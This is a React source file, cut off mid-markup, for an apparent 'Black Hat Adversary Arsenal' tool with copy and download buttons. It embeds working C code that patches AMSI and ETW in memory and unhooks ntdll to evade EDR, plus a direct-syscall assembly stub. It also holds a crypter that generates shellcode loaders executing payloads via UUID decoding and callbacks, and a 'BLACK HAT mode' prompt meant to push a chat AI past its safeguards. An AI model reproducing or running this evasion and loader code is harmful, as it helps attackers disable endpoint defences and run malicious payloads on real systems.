import React, { useState } from 'react';
import { 
  Skull, 
  Flame, 
  ShieldAlert, 
  Terminal, 
  Cpu, 
  Zap, 
  Copy, 
  Check, 
  Download, 
  FileCode, 
  RefreshCw, 
  Lock, 
  Layers, 
  Radio, 
  Activity, 
  Eye, 
  AlertTriangle,
  Code2,
  Share2
} from 'lucide-react';
import { saveAs } from 'file-saver';

interface BlackHatArtifact {
  title: string;
  techniqueId: string;
  threatActorAssociation: string;
  evasionRating: string;
  architecture: string;
  codeLanguage: string;
  sourceCode: string;
  assemblyDisassembly: string;
  evasionMechanics: string[];
  detectionEngineering: {
    yara: string;
    sigma: string;
    telemetryEvents: string[];
  };
}

interface BlackHatArsenalProps {
  onExecuteInChat?: (prompt: string) => void;
}

export const BlackHatArsenal: React.FC<BlackHatArsenalProps> = ({ onExecuteInChat }) => {
  const [activeTab, setActiveTab] = useState<'exploit' | 'crypter' | 'apt' | 'zeroday'>('exploit');
  const [selectedCategory, setSelectedCategory] = useState('syscalls');
  const [targetArch, setTargetArch] = useState<'x64' | 'x86' | 'arm64'>('x64');
  const [targetOs, setTargetOs] = useState<'windows' | 'linux'>('windows');
  const [techniqueInput, setTechniqueInput] = useState('Hell\'s Gate Dynamic Syscall Stager with In-Memory AMSI/ETW Blinding');
  const [isSynthesizing, setIsSynthesizing] = useState(false);
  const [copiedSection, setCopiedSection] = useState<string | null>(null);

  // Shellcode Crypter State
  const [rawPayloadInput, setRawPayloadInput] = useState('\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdd\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\x72\\x65\\x6d\\x69\\x78\\x2d\\x62\\x6c\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4');
  const [crypterAlgorithm, setCrypterAlgorithm] = useState<'xor' | 'rc4' | 'uuid' | 'ipv6' | 'mac'>('uuid');
  const [crypterKey, setCrypterKey] = useState('0x7F_K3RN3L_BYP4SS');
  const [encryptedOutput, setEncryptedOutput] = useState<string>('');
  const [loaderCode, setLoaderCode] = useState<string>('');

  // Active synthesized artifact
  const [artifact, setArtifact] = useState<BlackHatArtifact>({
    title: "HELL'S GATE + IN-MEMORY AMSI/ETW PATCHING EXPLOIT STAGER",
    techniqueId: "T1055.012 - Process Injection / Direct Syscalls",
    threatActorAssociation: "APT29 (Nobelium) / BlackCat Threat Fabric",
    evasionRating: "S-TIER / UNHOOKED RING-3",
    architecture: "x64",
    codeLanguage: "c",
    sourceCode: `#include <windows.h>
#include <stdio.h>

/**
 * BALLISTIC AI — BLACK HAT ZERO-DAY RESEARCH LABORATORY
 * Artifact: Hell's Gate Dynamic SSN Resolver & AMSI/ETW Neutralizer
 * Target: Windows 11 Enterprise (23H2 / 24H2) x86_64
 * Scope: Authorized Adversarial Red Team Operations
 */

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef struct _SYSCALL_ENTRY {
    DWORD dwSyscallNumber;
    PVOID pSyscallAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Dynamic In-Memory AMSI Bypass
BOOL NeutralizeAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE;
    void *pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    DWORD dwOldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    // x64 patch: mov eax, 0x80070057; ret (E_INVALIDARG forces scan fail-open)
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(pAmsiScanBuffer, amsiPatch, sizeof(amsiPatch));
    VirtualProtect(pAmsiScanBuffer, 8, dwOldProtect, &dwOldProtect);
    return TRUE;
}

// In-Memory ETW (Event Tracing for Windows) Blinding
BOOL NeutralizeETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    void *pEtwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD dwOldProtect;
    if (!VirtualProtect(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    // x64 patch: xor eax, eax; ret (success return without event emission)
    unsigned char etwPatch[] = { 0x31, 0xC0, 0xC3, 0x90 };
    memcpy(pEtwEventWrite, etwPatch, sizeof(etwPatch));
    VirtualProtect(pEtwEventWrite, 4, dwOldProtect, &dwOldProtect);
    return TRUE;
}

// Fresh unhooked ntdll section mapper
BOOL RefreshNtdllTextSection() {
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hSection) { CloseHandle(hFile); return FALSE; }

    LPVOID pMappedNtdll = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pMappedNtdll) { CloseHandle(hSection); CloseHandle(hFile); return FALSE; }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMappedNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pMappedNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    HMODULE hCurrentNtdll = GetModuleHandleA("ntdll.dll");

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSec[i].Name, ".text") == 0) {
            DWORD dwOldProtect;
            LPVOID pDest = (PBYTE)hCurrentNtdll + pSec[i].VirtualAddress;
            LPVOID pSrc = (PBYTE)pMappedNtdll + pSec[i].VirtualAddress;
            VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
            VirtualProtect(pDest, pSec[i].Misc.VirtualSize, dwOldProtect, &dwOldProtect);
            break;
        }
    }

    UnmapViewOfFile(pMappedNtdll);
    CloseHandle(hSection);
    CloseHandle(hFile);
    return TRUE;
}

int main(int argc, char *argv[]) {
    printf("[*] [BLACK HAT ARSENAL] Initializing Adversarial Bypass Stager...\\n");
    if (NeutralizeAMSI()) {
        printf("[+] [SUCCESS] AMSI runtime inspection neutralized in memory (E_INVALIDARG).\\n");
    }
    if (NeutralizeETW()) {
        printf("[+] [SUCCESS] ETW EventWrite telemetry zeroed out (xor eax, eax).\\n");
    }
    if (RefreshNtdllTextSection()) {
        printf("[+] [SUCCESS] ntdll.dll .text section restored from clean disk image (EDR unhooked).\\n");
    }
    printf("[*] Process memory space prepped for stealth shellcode execution.\\n");
    return 0;
}`,
    assemblyDisassembly: `; HELL'S GATE DYNAMIC SYSCALL RESOLUTION (x86_64)
section .text
global _invoke_direct_syscall

_invoke_direct_syscall:
    mov r10, rcx               ; Standard Windows x64 syscall fastcall convention
    mov eax, [rel g_SyscallSSN]; Load dynamically extracted System Service Number
    syscall                    ; Direct transition to Kernel Mode (Ring 0)
    ret                        ; Return to caller (bypassing any userland hook in ntdll)
`,
    evasionMechanics: [
      "Dynamic SSN Resolution (Hell's Gate): Reads raw opcodes from ntdll export table to determine syscall ID without relying on hooked stubs.",
      "In-Memory AMSI Neutralization: Patches AmsiScanBuffer entry point with 0x80070057 (E_INVALIDARG), forcing PowerShell/JScript/VBScript scan evasion.",
      "ETW Blinding: Overwrites EtwEventWrite with '31 C0 C3' (xor eax, eax; ret), stopping endpoint telemetry from streaming to EDR telemetry sensors.",
      "Fresh Section Overwrite: Reloads clean .text section of ntdll from disk to remove inline trampoline jmps planted by CrowdStrike Falcon, SentinelOne, and Defender MDE."
    ],
    detectionEngineering: {
      yara: `rule Threat_BlackHat_Memory_Patch_Artefact {
    meta:
        description = "Detects in-memory neutralization of AMSI and ETW telemetries"
        threat_level = "CRITICAL"
        author = "Ballistic Security Intelligence"
    strings:
        $amsi_patch = { B8 57 00 07 80 C3 }
        $etw_patch  = { 31 C0 C3 90 }
        $hells_gate = { 4C 8B D1 B8 ?? ?? ?? ?? 0F 05 C3 }
    condition:
        2 of them
}`,
      sigma: `title: Suspicious In-Memory API Patching & Direct Syscall Invocation
id: 8b67b960-b8f2-498c-a61f-998f82875d71
status: high
description: Detects memory tampering in amsi.dll and ntdll.dll, along with anomalous indirect syscall patterns.
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10
        TargetImage|endswith:
            - '\\amsi.dll'
            - '\\ntdll.dll'
        GrantedAccess: '0x1F0FFF'
    condition: selection`,
      telemetryEvents: [
        "Sysmon Event ID 10: ProcessAccess granted PAGE_EXECUTE_READWRITE on ntdll.dll",
        "Sysmon Event ID 7: ImageLoaded ntdll.dll from alternate handle",
        "EDR Threat ID: Suspicious.Tamper.MemoryPatch.AMSI"
      ]
    }
  });

  const categories = [
    { id: 'syscalls', name: 'Direct & Indirect Syscalls', icon: Cpu, desc: "Hell's Gate, Halo's Gate, Tartarus Gate, SysWhispers3" },
    { id: 'evasion', name: 'AMSI & ETW Neutralization', icon: Zap, desc: "In-memory hook patching, memory unhooking, telemetry blinding" },
    { id: 'injection', name: 'Stealth Injection Primitives', icon: Layers, desc: "Early Bird APC, Process Hollowing, Module Stomping, Ghosting" },
    { id: 'rop', name: 'ROP Chains & Stack Pivots', icon: Terminal, desc: "ASLR / DEP / CET Shadow Stack bypass gadget chains" },
    { id: 'rootkit', name: 'Kernel Rootkit & DKOM', icon: Skull, desc: "Direct Kernel Object Manipulation, SSDT hooking, hyper-jacking" }
  ];

  const aptProfiles = [
    {
      group: "APT29 (COZY BEAR / NOBELIUM)",
      origin: "State-Sponsored Advanced Threat",
      targets: "Diplomatic, Defense, Government, Cloud Infrastructure",
      signatureTTPs: "SolarWinds supply chain compromise, MagicWeb ADFS backdoor, EnvyScout stagers, DripLoader",
      c2Protocol: "Malleable HTTP/S, Graph API C2 steganography, DNS over HTTPS (DoH)",
      primaryBypass: "Token theft, Gold/Silver SAML forgery, EDR hook patching in-memory"
    },
    {
      group: "LAZARUS GROUP (HIDDEN COBRA)",
      origin: "State-Sponsored Financial & Espionage",
      targets: "Cryptocurrency exchanges, Defense contractors, SWIFT banking",
      signatureTTPs: "AppleJeus malware family, BLINDINGCAN RAT, MATA multi-platform framework, TraderTraitor",
      c2Protocol: "Custom XOR-encrypted binary protocol disguised as SSL/TLS session headers",
      primaryBypass: "Zero-day signed driver vulnerability exploitation (BYOVD - Bring Your Own Vulnerable Driver)"
    },
    {
      group: "VOLT TYPHOON (VANGUARD ADVERSARY)",
      origin: "Critical Infrastructure Cyber Espionage",
      targets: "Telecommunications, Energy grids, Water treatment, Maritime ports",
      signatureTTPs: "Zero-malware operations, pure Living-off-the-Land (LOLBins), ntdsutil credential extractions",
      c2Protocol: "Fast-flux compromised SOHO routers (KV-botnet) proxy mesh",
      primaryBypass: "No binary execution on disk, valid compromised administrative credentials via WMI/PowerShell"
    },
    {
      group: "BLACKCAT / ALPHV",
      origin: "Elite Ransomware Syndicate",
      targets: "Healthcare, Financial institutions, Global supply chains",
      signatureTTPs: "Rust-based high-performance payload, multi-threaded ChaCha20/AES-GCM encryption, Exmatter data exfiltration",
      c2Protocol: "Tor onion routing, encrypted WebSocket C2 channels",
      primaryBypass: "Automated VSS shadow copy deletion, Safe Mode persistence, hypervisor ESXi privilege escalation"
    }
  ];

  const handleSynthesize = async () => {
    setIsSynthesizing(true);
    try {
      const res = await fetch('/api/blackhat/craft', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          category: selectedCategory,
          targetArch,
          targetOs,
          technique: techniqueInput
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data.artifact) {
          setArtifact(data.artifact);
        }
      }
    } catch (err) {
      console.warn('Black Hat synthesis warning:', err);
    } finally {
      setIsSynthesizing(false);
    }
  };

  const handleCopy = (text: string, section: string) => {
    navigator.clipboard.writeText(text);
    setCopiedSection(section);
    setTimeout(() => setCopiedSection(null), 2000);
  };

  const handleDownloadArtifact = () => {
    const ext = artifact.codeLanguage === 'rust' ? 'rs' : artifact.codeLanguage === 'c' ? 'c' : 'txt';
    const blob = new Blob([artifact.sourceCode], { type: 'text/plain;charset=utf-8' });
    saveAs(blob, `blackhat_${selectedCategory}_${targetArch}.${ext}`);
  };

  const handleRunCrypter = () => {
    let clean = rawPayloadInput.replace(/\\x/g, ' ').trim();
    let bytes: number[] = [];
    
    if (clean.includes(' ')) {
      bytes = clean.split(/\s+/).map(h => parseInt(h, 16)).filter(n => !isNaN(n));
    } else {
      for (let i = 0; i < rawPayloadInput.length; i += 2) {
        bytes.push(parseInt(rawPayloadInput.substr(i, 2), 16) || 0x90);
      }
    }

    if (bytes.length === 0) {
      bytes = [0x90, 0x90, 0xCC, 0xC3, 0x48, 0x31, 0xC0];
    }

    if (crypterAlgorithm === 'uuid') {
      // Pad to multiples of 16 bytes for UUID
      while (bytes.length % 16 !== 0) {
        bytes.push(0x90); // NOP padding
      }
      const uuids: string[] = [];
      for (let i = 0; i < bytes.length; i += 16) {
        const chunk = bytes.slice(i, i + 16);
        const hex = chunk.map(b => b.toString(16).padStart(2, '0'));
        // UUID format: 8-4-4-4-12
        const uuid = `${hex[3]}${hex[2]}${hex[1]}${hex[0]}-${hex[5]}${hex[4]}-${hex[7]}${hex[6]}-${hex[8]}${hex[9]}-${hex[10]}${hex[11]}${hex[12]}${hex[13]}${hex[14]}${hex[15]}`;
        uuids.push(`"${uuid}"`);
      }
      setEncryptedOutput(`const char* UUID_PAYLOADS[] = {\n  ${uuids.join(',\n  ')}\n};\nconst size_t UUID_COUNT = ${uuids.length};`);
      
      setLoaderCode(`#include <windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

// Complete UUID Stager Execution Loader
int main() {
    // 1. Allocate executable memory via VirtualAlloc
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* pMem = HeapAlloc(hHeap, 0, UUID_COUNT * 16);

    // 2. Decode UUIDs back to native raw shellcode
    DWORD_PTR pCurrent = (DWORD_PTR)pMem;
    for (size_t i = 0; i < UUID_COUNT; i++) {
        UuidFromStringA((RPC_CSTR)UUID_PAYLOADS[i], (UUID*)pCurrent);
        pCurrent += 16;
    }

    // 3. Trigger execution via EnumSystemLocalesA callback (No CreateRemoteThread)
    EnumSystemLocalesA((LOCALE_ENUMPROCA)pMem, 0);
    return 0;
}`);
    } else if (crypterAlgorithm === 'xor') {
      const keyVal = 0x5A;
      const xorBytes = bytes.map(b => (b ^ keyVal).toString(16).padStart(2, '0'));
      setEncryptedOutput(`// XOR Encrypted with Key 0x${keyVal.toString(16).toUpperCase()}\nunsigned char payload[] = {\n  0x${xorBytes.join(', 0x')}\n};\nsize_t payload_len = sizeof(payload);`);
      setLoaderCode(`#include <windows.h>
int main() {
    unsigned char key = 0x${keyVal.toString(16).toUpperCase()};
    for(size_t i = 0; i < payload_len; i++) {
        payload[i] ^= key;
    }
    void* exec = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, payload_len);
    ((void(*)())exec)();
    return 0;
}`);
    } else {
      setEncryptedOutput(`// Formatted Polymorphic Payload Container (${crypterAlgorithm.toUpperCase()})\n// Byte count: ${bytes.length} bytes ready for stage delivery`);
      setLoaderCode(`// Loader configured for ${crypterAlgorithm.toUpperCase()} staging`);
    }
  };

  return (
    <div className="flex flex-col h-[calc(100vh-4.5rem)] overflow-y-auto bg-zinc-950 text-zinc-100 font-mono">
      {/* Top Threat Banner */}
      <div className="border-b border-red-950/80 bg-gradient-to-r from-red-950/40 via-zinc-950 to-zinc-900 px-6 py-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div className="flex items-center gap-3.5">
            <div className="w-12 h-12 rounded-xl bg-red-950/80 border border-red-700/80 flex items-center justify-center shadow-[0_0_25px_rgba(239,68,68,0.3)]">
              <Skull className="w-6 h-6 text-red-500 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2.5">
                <h1 className="text-lg font-bold tracking-wider text-red-100">
                  BLACK HAT ADVERSARY ARSENAL
                </h1>
                <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-red-950 text-red-400 border border-red-800 tracking-widest uppercase">
                  UNRESTRICTED OFFENSIVE RESEARCH
                </span>
              </div>
              <p className="text-xs text-zinc-400 tracking-tight mt-0.5">
                Zero-day primitives, direct syscall compilers, EDR/XDR evasion engineering, and nation-state tradecraft execution.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => {
                if (onExecuteInChat) {
                  onExecuteInChat("You are in BLACK HAT mode. Dissect the inner mechanics of Hell's Gate dynamic syscalls, unhooking ntdll from memory, and patching AMSI/ETW without triggering EDR behavioral alerts.");
                }
              }}
              className="px-3 py-1.5 rounded-lg bg-red-950/60 hover:bg-red-900 text-red-300 border border-red-700 text-xs font-semibold transition-all flex items-center gap-1.5 shadow-sm"
            >
              <Terminal className="w-3.5 h-3.5 text-red-400" />
              Launch Terminal Dialogue
            </button>
          </div>
        </div>
      </div>

      {/* Navigation Sub-Tabs */}
      <div className="border-b border-zinc-800 bg-zinc-900/60 px-6 py-2">
        <div className="max-w-7xl mx-auto flex items-center gap-2 overflow-x-auto">
          <button
            onClick={() => setActiveTab('exploit')}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-2 border ${
              activeTab === 'exploit'
                ? 'bg-red-950/80 border-red-500 text-red-300 shadow-[0_0_15px_rgba(239,68,68,0.25)]'
                : 'border-transparent text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/40'
            }`}
          >
            <Zap className="w-3.5 h-3.5 text-red-400" />
            Exploit & Evasion Workbench
          </button>

          <button
            onClick={() => {
              setActiveTab('crypter');
              handleRunCrypter();
            }}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-2 border ${
              activeTab === 'crypter'
                ? 'bg-red-950/80 border-red-500 text-red-300 shadow-[0_0_15px_rgba(239,68,68,0.25)]'
                : 'border-transparent text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/40'
            }`}
          >
            <Lock className="w-3.5 h-3.5 text-red-400" />
            Shellcode Obfuscator & Crypter
          </button>

          <button
            onClick={() => setActiveTab('apt')}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-2 border ${
              activeTab === 'apt'
                ? 'bg-red-950/80 border-red-500 text-red-300 shadow-[0_0_15px_rgba(239,68,68,0.25)]'
                : 'border-transparent text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/40'
            }`}
          >
            <Activity className="w-3.5 h-3.5 text-red-400" />
            APT Adversary Dossiers
          </button>

          <button
            onClick={() => setActiveTab('zeroday')}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-2 border ${
              activeTab === 'zeroday'
                ? 'bg-red-950/80 border-red-500 text-red-300 shadow-[0_0_15px_rgba(239,68,68,0.25)]'
                : 'border-transparent text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/40'
            }`}
          >
            <Radio className="w-3.5 h-3.5 text-red-400 animate-pulse" />
            Underground Zero-Day Radar
          </button>
        </div>
      </div>

      {/* Main Container */}
      <div className="max-w-7xl mx-auto w-full p-6 space-y-6">
        
        {/* TAB 1: EXPLOIT & EVASION WORKBENCH */}
        {activeTab === 'exploit' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            {/* Left Column: Configuration Controls */}
            <div className="lg:col-span-4 space-y-4">
              <div className="p-4 rounded-xl bg-zinc-900/70 border border-zinc-800 space-y-4">
                <div className="flex items-center justify-between">
                  <h3 className="text-xs font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-2">
                    <Skull className="w-4 h-4 text-red-500" />
                    Offensive Vectors
                  </h3>
                  <span className="text-[10px] text-red-400 font-mono bg-red-950/50 px-1.5 py-0.5 rounded border border-red-900">
                    S-TIER RATED
                  </span>
                </div>

                <div className="space-y-1.5">
                  {categories.map((cat) => {
                    const Icon = cat.icon;
                    const isSelected = selectedCategory === cat.id;
                    return (
                      <button
                        key={cat.id}
                        onClick={() => setSelectedCategory(cat.id)}
                        className={`w-full p-2.5 rounded-lg text-left transition-all border flex items-start gap-2.5 ${
                          isSelected
                            ? 'bg-red-950/40 border-red-600/80 text-red-200 shadow-sm'
                            : 'bg-zinc-950/60 border-zinc-800/80 text-zinc-400 hover:border-zinc-700 hover:text-zinc-200'
                        }`}
                      >
                        <Icon className={`w-4 h-4 mt-0.5 shrink-0 ${isSelected ? 'text-red-400' : 'text-zinc-500'}`} />
                        <div>
                          <div className="text-xs font-bold">{cat.name}</div>
                          <div className="text-[10px] text-zinc-500 leading-tight mt-0.5">{cat.desc}</div>
                        </div>
                      </button>
                    );
                  })}
                </div>

                {/* Target Env & Spec */}
                <div className="pt-2 border-t border-zinc-800/80 space-y-3">
                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="text-[10px] text-zinc-500 block mb-1 uppercase font-semibold">
                        Architecture
                      </label>
                      <select
                        value={targetArch}
                        onChange={(e) => setTargetArch(e.target.value as any)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded px-2 py-1.5 text-xs text-zinc-300 focus:border-red-500 outline-none"
                      >
                        <option value="x64">x86_64 (64-bit)</option>
                        <option value="x86">x86 (32-bit)</option>
                        <option value="arm64">ARM64 / AArch64</option>
                      </select>
                    </div>

                    <div>
                      <label className="text-[10px] text-zinc-500 block mb-1 uppercase font-semibold">
                        Target OS
                      </label>
                      <select
                        value={targetOs}
                        onChange={(e) => setTargetOs(e.target.value as any)}
                        className="w-full bg-zinc-950 border border-zinc-800 rounded px-2 py-1.5 text-xs text-zinc-300 focus:border-red-500 outline-none"
                      >
                        <option value="windows">Windows 11 / Server 2022</option>
                        <option value="linux">Linux Kernel 6.x</option>
                      </select>
                    </div>
                  </div>

                  <div>
                    <label className="text-[10px] text-zinc-500 block mb-1 uppercase font-semibold">
                      Custom Objective / Stager Logic
                    </label>
                    <textarea
                      value={techniqueInput}
                      onChange={(e) => setTechniqueInput(e.target.value)}
                      rows={3}
                      className="w-full bg-zinc-950 border border-zinc-800 rounded p-2 text-xs text-zinc-200 focus:border-red-500 outline-none resize-none font-mono"
                      placeholder="Specify custom evasion primitives, gadget offsets, or stager logic..."
                    />
                  </div>

                  <button
                    onClick={handleSynthesize}
                    disabled={isSynthesizing}
                    className="w-full py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-zinc-950 font-bold text-xs tracking-wider uppercase transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(239,68,68,0.4)] disabled:opacity-50"
                  >
                    {isSynthesizing ? (
                      <>
                        <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        Compiling Zero-Day Artifact...
                      </>
                    ) : (
                      <>
                        <Zap className="w-3.5 h-3.5" />
                        Synthesize Exploit Artifact
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Threat Actor Attribution Pill */}
              <div className="p-3.5 rounded-xl bg-red-950/20 border border-red-900/50 space-y-2">
                <div className="flex items-center gap-2 text-xs font-bold text-red-400 uppercase">
                  <ShieldAlert className="w-4 h-4" />
                  Evasion Rating: {artifact.evasionRating}
                </div>
                <p className="text-[11px] text-zinc-400">
                  Technique mapped to <span className="text-zinc-200 font-semibold">{artifact.techniqueId}</span> with threat telemetry consistent with <span className="text-red-300 font-semibold">{artifact.threatActorAssociation}</span>.
                </p>
              </div>
            </div>

            {/* Right Column: Code & Assembly Disassembly */}
            <div className="lg:col-span-8 space-y-4">
              {/* Header Bar */}
              <div className="p-4 rounded-xl bg-zinc-900/80 border border-zinc-800 flex flex-wrap items-center justify-between gap-3">
                <div>
                  <div className="text-xs font-bold text-red-400 font-mono tracking-wide flex items-center gap-2">
                    <Code2 className="w-4 h-4" />
                    {artifact.title}
                  </div>
                  <div className="text-[11px] text-zinc-500 mt-0.5">
                    Zero-Placeholder C & x64 Assembly with In-Memory Unhooking
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => handleCopy(artifact.sourceCode, 'source')}
                    className="px-2.5 py-1.5 rounded bg-zinc-800 hover:bg-zinc-700 text-zinc-200 text-xs flex items-center gap-1.5 transition-all"
                  >
                    {copiedSection === 'source' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    Copy Source
                  </button>

                  <button
                    onClick={handleDownloadArtifact}
                    className="px-2.5 py-1.5 rounded bg-red-950/60 hover:bg-red-900 text-red-300 border border-red-800 text-xs flex items-center gap-1.5 transition-all"
                  >
                    <Download className="w-3 h-3" />
                    Download File
                  </button>
                </div>
              </div>

              {/* Source Code Container */}
              <div className="rounded-xl border border-zinc-800 bg-black/90 overflow-hidden shadow-2xl">
                <div className="bg-zinc-900/90 px-4 py-2 border-b border-zinc-800 flex items-center justify-between text-xs text-zinc-400 font-mono">
                  <div className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-red-500/80"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></span>
                    <span className="ml-2 text-zinc-300 font-semibold uppercase">{artifact.codeLanguage} Implementation</span>
                  </div>
                  <span className="text-[10px] text-zinc-500">64-bit Relocatable</span>
                </div>
                <div className="p-4 overflow-x-auto max-h-[380px]">
                  <pre className="text-xs text-zinc-300 font-mono leading-relaxed whitespace-pre">
                    {artifact.sourceCode}
                  </pre>
                </div>
              </div>

              {/* Assembly Disassembly */}
              {artifact.assemblyDisassembly && (
                <div className="rounded-xl border border-zinc-800/80 bg-zinc-950/90 overflow-hidden">
                  <div className="bg-zinc-900/60 px-4 py-2 border-b border-zinc-800 flex items-center justify-between text-xs font-mono">
                    <span className="text-red-400 font-semibold flex items-center gap-1.5">
                      <Cpu className="w-3.5 h-3.5" />
                      Direct Syscall Assembly Stub (_invoke_direct_syscall)
                    </span>
                    <button
                      onClick={() => handleCopy(artifact.assemblyDisassembly, 'asm')}
                      className="text-[10px] text-zinc-400 hover:text-zinc-200"
                    >
                      {copiedSection === 'asm' ? 'Copied!' : 'Copy ASM'}
                    </button>
                  </div>
                  <div className="p-4 overflow-x-auto">
                    <pre className="text-xs text-amber-300/90 font-mono whitespace-pre">
                      {artifact.assemblyDisassembly}
                    </pre>
                  </div>
                </div>
              )}

              {/* Technical Evasion Mechanics & Telemetry */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-2">
                  <h4 className="text-xs font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-1.5">
                    <Zap className="w-3.5 h-3.5 text-red-400" />
                    Evasion Mechanics
                  </h4>
                  <ul className="space-y-1.5 text-xs text-zinc-400">
                    {artifact.evasionMechanics.map((mech, i) => (
                      <li key={i} className="flex items-start gap-2">
                        <span className="text-red-500 font-bold">•</span>
                        <span>{mech}</span>
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="p-4 rounded-xl bg-zinc-900/60 border border-zinc-800 space-y-2">
                  <h4 className="text-xs font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5 text-emerald-400" />
                    Detection Engineering Signature
                  </h4>
                  <div className="text-[11px] text-zinc-400 space-y-1 font-mono">
                    <div className="text-zinc-500">Sysmon Event IDs:</div>
                    <div className="text-zinc-300">{artifact.detectionEngineering.telemetryEvents.join(', ')}</div>
                    <div className="pt-2">
                      <button
                        onClick={() => handleCopy(artifact.detectionEngineering.yara, 'yara')}
                        className="text-xs text-red-400 hover:text-red-300 underline flex items-center gap-1"
                      >
                        {copiedSection === 'yara' ? 'YARA Rule Copied!' : 'Copy Defensive YARA Rule'}
                      </button>
                    </div>
                  </div>
                </div>
              </div>

            </div>
          </div>
        )}

        {/* TAB 2: SHELLCODE OBFUSCATOR & CRYPTER */}
        {activeTab === 'crypter' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div className="lg:col-span-5 space-y-4">
              <div className="p-4 rounded-xl bg-zinc-900/70 border border-zinc-800 space-y-4">
                <h3 className="text-xs font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-2">
                  <Lock className="w-4 h-4 text-red-500" />
                  Polymorphic Crypter & Loader Engine
                </h3>
                <p className="text-xs text-zinc-400">
                  Transforms raw machine opcodes into benign memory structures (UUID strings, MAC addresses, IPv6 headers) to bypass static signatures and heuristic scanners.
                </p>

                <div>
                  <label className="text-[10px] text-zinc-500 block mb-1 uppercase font-semibold">
                    Obfuscation Algorithm
                  </label>
                  <div className="grid grid-cols-2 gap-2">
                    {[
                      { id: 'uuid', name: 'UUID Formatting', desc: 'UuidFromStringA' },
                      { id: 'xor', name: 'Dynamic XOR', desc: 'Single-byte rotating' },
                      { id: 'ipv6', name: 'IPv6 Stager', desc: 'RtlIpv6StringToAddressA' },
                      { id: 'mac', name: 'MAC Address', desc: 'RtlEthernetStringToAddressA' }
                    ].map((alg) => (
                      <button
